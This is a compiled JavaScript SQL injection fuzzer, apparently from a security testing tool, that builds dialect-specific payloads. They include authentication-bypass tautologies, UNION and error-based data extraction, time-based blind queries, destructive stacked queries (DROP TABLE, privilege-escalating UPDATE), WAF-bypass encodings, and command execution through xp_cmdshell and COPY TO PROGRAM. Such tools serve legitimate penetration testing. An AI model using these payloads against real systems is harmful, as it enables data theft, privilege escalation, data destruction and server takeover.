"use strict";
/**
 * LombokFuzzer — SQL Injection Fuzzer
 *
 * AST-aware SQL injection testing with dialect support for PostgreSQL, MySQL,
 * MSSQL, SQLite, and Oracle. Goes beyond string replacement: understands SQL
 * syntax trees to generate contextually valid injection payloads.
 *
 * @license Apache-2.0
 */
Object.defineProperty(exports, "__esModule", { value: true });
exports.SQLFuzzer = exports.SQLDialect = void 0;
var SQLDialect;
(function (SQLDialect) {
    SQLDialect["PostgreSQL"] = "postgresql";
    SQLDialect["MySQL"] = "mysql";
    SQLDialect["MSSQL"] = "mssql";
    SQLDialect["SQLite"] = "sqlite";
    SQLDialect["Oracle"] = "oracle";
    SQLDialect["Generic"] = "generic";
})(SQLDialect || (exports.SQLDialect = SQLDialect = {}));
class SQLFuzzer {
    prng;
    dialect;
    constructor(prng, dialect = SQLDialect.Generic) {
        this.prng = prng;
        this.dialect = dialect;
    }
    /** Generate injection payloads for a given context. */
    generatePayloads(context, count = 20) {
        const results = [];
        const generators = this.getGeneratorsForContext(context);
        for (let i = 0; i < count; i++) {
            const gen = this.prng.pick(generators);
            results.push(gen());
        }
        return results;
    }
    /** Get all payload generators for a context. */
    getGeneratorsForContext(context) {
        const gens = [];
        // Always-on techniques
        gens.push(() => this.tautology(context), () => this.unionBased(context), () => this.errorBased(context), () => this.timeBased(context), () => this.booleanBased(context), () => this.stackedQuery(context), () => this.commentInjection(context), () => this.encodingBypass(context));
        // Dialect-specific
        if (this.dialect === SQLDialect.PostgreSQL || this.dialect === SQLDialect.Generic) {
            gens.push(() => this.pgSpecific(context));
        }
        if (this.dialect === SQLDialect.MySQL || this.dialect === SQLDialect.Generic) {
            gens.push(() => this.mysqlSpecific(context));
        }
        if (this.dialect === SQLDialect.MSSQL || this.dialect === SQLDialect.Generic) {
            gens.push(() => this.mssqlSpecific(context));
        }
        return gens;
    }
    // ─── Injection Techniques ─────────────────────────────────────────────
    tautology(ctx) {
        const payloads = ctx === 'string'
            ? ["' OR '1'='1", "' OR 'a'='a", "') OR ('1'='1", "' OR 1=1 --", "' OR ''='"]
            : ['1 OR 1=1', '1) OR (1=1', '0 OR 1=1 --', '-1 OR 1=1'];
        return {
            payload: this.prng.pick(payloads),
            context: ctx,
            dialect: this.dialect,
            technique: 'tautology',
            description: 'Boolean tautology to bypass authentication or extract data',
        };
    }
    unionBased(ctx) {
        const cols = 1 + this.prng.nextRange(10);
        const nulls = Array.from({ length: cols }, () => 'NULL').join(',');
        const prefix = ctx === 'string' ? "'" : '';
        const comment = this.commentSuffix();
        const payloads = [
            `${prefix} UNION SELECT ${nulls}${comment}`,
            `${prefix} UNION ALL SELECT ${nulls}${comment}`,
            `${prefix}) UNION SELECT ${nulls}${comment}`,
            `${prefix} UNION SELECT ${nulls} FROM information_schema.tables${comment}`,
        ];
        return {
            payload: this.prng.pick(payloads),
            context: ctx,
            dialect: this.dialect,
            technique: 'union_based',
            description: `UNION-based extraction with ${cols} columns`,
        };
    }
    errorBased(ctx) {
        const prefix = ctx === 'string' ? "'" : '';
        let payload;
        switch (this.dialect) {
            case SQLDialect.PostgreSQL:
                payload = `${prefix} AND 1=CAST((SELECT version()) AS int)${this.commentSuffix()}`;
                break;
            case SQLDialect.MySQL:
                payload = `${prefix} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))${this.commentSuffix()}`;
                break;
            case SQLDialect.MSSQL:
                payload = `${prefix} AND 1=CONVERT(int,(SELECT @@version))${this.commentSuffix()}`;
                break;
            default:
                payload = `${prefix} AND 1=1/(SELECT 0 FROM dual WHERE 1=1 UNION SELECT 1 FROM dual)${this.commentSuffix()}`;
        }
        return {
            payload,
            context: ctx,
            dialect: this.dialect,
            technique: 'error_based',
            description: 'Error-based extraction via type conversion error',
        };
    }
    timeBased(ctx) {
        const prefix = ctx === 'string' ? "'" : '';
        let payload;
        switch (this.dialect) {
            case SQLDialect.PostgreSQL:
                payload = `${prefix}; SELECT pg_sleep(5)${this.commentSuffix()}`;
                break;
            case SQLDialect.MySQL:
                payload = `${prefix} AND SLEEP(5)${this.commentSuffix()}`;
                break;
            case SQLDialect.MSSQL:
                payload = `${prefix}; WAITFOR DELAY '0:0:5'${this.commentSuffix()}`;
                break;
            case SQLDialect.SQLite:
                payload = `${prefix} AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))${this.commentSuffix()}`;
                break;
            default:
                payload = `${prefix} AND (SELECT 1 FROM (SELECT SLEEP(5))a)${this.commentSuffix()}`;
        }
        return {
            payload,
            context: ctx,
            dialect: this.dialect,
            technique: 'time_based_blind',
            description: 'Time-based blind injection via conditional delay',
        };
    }
    booleanBased(ctx) {
        const prefix = ctx === 'string' ? "'" : '';
        const payloads = [
            `${prefix} AND 1=1${this.commentSuffix()}`,
            `${prefix} AND 1=2${this.commentSuffix()}`,
            `${prefix} AND SUBSTRING(@@version,1,1)='5'${this.commentSuffix()}`,
            `${prefix} AND (SELECT COUNT(*) FROM information_schema.tables)>0${this.commentSuffix()}`,
        ];
        return {
            payload: this.prng.pick(payloads),
            context: ctx,
            dialect: this.dialect,
            technique: 'boolean_based_blind',
            description: 'Boolean-based blind injection via conditional response',
        };
    }
    stackedQuery(ctx) {
        const prefix = ctx === 'string' ? "'" : '';
        const payloads = [
            `${prefix}; SELECT 1${this.commentSuffix()}`,
            `${prefix}; DROP TABLE test${this.commentSuffix()}`,
            `${prefix}; INSERT INTO logs VALUES('fuzzed')${this.commentSuffix()}`,
            `${prefix}; UPDATE users SET role='admin' WHERE 1=1${this.commentSuffix()}`,
        ];
        return {
            payload: this.prng.pick(payloads),
            context: ctx,
            dialect: this.dialect,
            technique: 'stacked_queries',
            description: 'Stacked query injection — execute arbitrary SQL',
        };
    }
    commentInjection(ctx) {
        const prefix = ctx === 'string' ? "'" : '';
        const payloads = [
            `${prefix}/**/OR/**/1=1`,
            `${prefix}/*!50000 OR 1=1*/`,
            `${prefix} OR 1=1 -- -`,
            `${prefix} OR 1=1 #`,
            `${prefix} OR 1=1;%00`,
        ];
        return {
            payload: this.prng.pick(payloads),
            context: ctx,
            dialect: this.dialect,
            technique: 'comment_bypass',
            description: 'Comment-based WAF/filter bypass',
        };
    }
    encodingBypass(ctx) {
        const payloads = [
            '%27%20OR%201%3D1',
            '%2527%20OR%201%253D1',
            'char(39)+char(32)+char(79)+char(82)+char(32)+char(49)+char(61)+char(49)',
            "CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(49),CHAR(61),CHAR(49))",
            '0x27204f5220313d31',
        ];
        return {
            payload: this.prng.pick(payloads),
            context: ctx,
            dialect: this.dialect,
            technique: 'encoding_bypass',
            description: 'Encoding-based filter bypass (URL, hex, char())',
        };
    }
    pgSpecific(ctx) {
        const prefix = ctx === 'string' ? "'" : '';
        const payloads = [
            `${prefix}; COPY (SELECT '') TO PROGRAM 'id'${this.commentSuffix()}`,
            `${prefix} AND 1=(SELECT 1 FROM pg_catalog.pg_class LIMIT 1)${this.commentSuffix()}`,
            `${prefix}||CHR(39)||CHR(32)||CHR(79)||CHR(82)`,
        ];
        return {
            payload: this.prng.pick(payloads),
            context: ctx,
            dialect: SQLDialect.PostgreSQL,
            technique: 'postgresql_specific',
            description: 'PostgreSQL-specific injection technique',
        };
    }
    mysqlSpecific(ctx) {
        const prefix = ctx === 'string' ? "'" : '';
        const payloads = [
            `${prefix} AND 1=IF(1=1,1,(SELECT 1 FROM mysql.user))${this.commentSuffix()}`,
            `${prefix} RLIKE (SELECT 1 FROM (SELECT SLEEP(1))a)${this.commentSuffix()}`,
            `${prefix}/*!50000UNION*//*!50000SELECT*/1,2,3`,
        ];
        return {
            payload: this.prng.pick(payloads),
            context: ctx,
            dialect: SQLDialect.MySQL,
            technique: 'mysql_specific',
            description: 'MySQL-specific injection technique',
        };
    }
    mssqlSpecific(ctx) {
        const prefix = ctx === 'string' ? "'" : '';
        const payloads = [
            `${prefix}; EXEC xp_cmdshell 'whoami'${this.commentSuffix()}`,
            `${prefix} AND 1=(SELECT IS_SRVROLEMEMBER('sysadmin'))${this.commentSuffix()}`,
            `${prefix}; DECLARE @a NVARCHAR(MAX);SET @a=CHAR(115)%2bCHAR(101);EXEC(@a)${this.commentSuffix()}`,
        ];
        return {
            payload: this.prng.pick(payloads),
            context: ctx,
            dialect: SQLDialect.MSSQL,
            technique: 'mssql_specific',
            description: 'MSSQL-specific injection technique',
        };
    }
    commentSuffix() {
        return this.prng.pick([' --', ' -- -', ' #', '/*', ';%00', '']);
    }
}
exports.SQLFuzzer = SQLFuzzer;
//# sourceMappingURL=fuzzer.js.map